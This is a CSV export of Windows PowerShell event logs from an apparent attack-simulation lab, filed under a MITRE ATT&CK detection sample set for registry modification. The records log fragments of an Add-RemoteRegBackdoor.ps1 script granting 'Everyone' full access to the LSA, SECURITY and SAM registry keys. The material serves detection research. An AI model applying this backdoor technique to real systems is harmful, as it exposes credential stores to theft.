RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
36,54740,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1083\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data] Backdooring completed for key\""\n"",""Binary"":""""}}"
37,54741,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1085\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Backdooring started for key\""\n"",""Binary"":""""}}"
38,54742,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1087\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
39,54743,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1089\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
40,54744,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1091\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
41,54745,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1093\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
42,54746,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1095\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
43,54747,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1097\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
44,54748,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1099\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG] Backdooring completed for key\""\n"",""Binary"":""""}}"
45,54749,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1101\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Backdooring started for key\""\n"",""Binary"":""""}}"
46,54750,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1103\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\""\n"",""Binary"":""""}}"
47,54751,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1105\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegAce = (New-Object System.Management.ManagementClass('win32_Ace')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\""\n"",""Binary"":""""}}"
48,54752,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1107\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Creating the trustee WMI object with user '$User'\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Creating the trustee WMI object with user 'Everyone'\""\n"",""Binary"":""""}}"
49,54753,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1109\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            $RegTrustee = (New-Object System.Management.ManagementClass('win32_Trustee')).CreateInstance()\n, CommandInvocation(New-Object): \""New-Object\""\nParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\""\nParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\""\n"",""Binary"":""""}}"
50,54754,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1111\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Applying Trustee to new Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Applying Trustee to new Ace\""\n"",""Binary"":""""}}"
51,54755,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1113\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Calling SetSecurityDescriptor on the key with the newly created Ace\""\n"",""Binary"":""""}}"
52,54756,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1115\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring completed for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Backdooring completed for key\""\n"",""Binary"":""""}}"
53,54757,2021-12-09 19:54:03.0000000,800,Info,PowerShell,Windows PowerShell,0,0,fs03vuln.offsec.lan,1,,Pipeline Execution Details,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
","HostName=ConsoleHost
","HostVersion=4.0
",,,,,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, \tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=1117\n\n\tUserId=OFFSEC\\hack1\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=a991c134-2e90-418c-940d-258271dd1e9c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=4315d698-493e-410a-8e70-1c07123fdca4\n\tPipelineId=88\n\tScriptName=C:\\TOOLS\\Add-RemoteRegBackdoor.ps1\n\tCommandLine=            Write-Verbose \""[$Computer : $Key] Backdooring started for key\""\n, CommandInvocation(Write-Verbose): \""Write-Verbose\""\nParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Backdooring started for key\""\n"",""Binary"":""""}}"
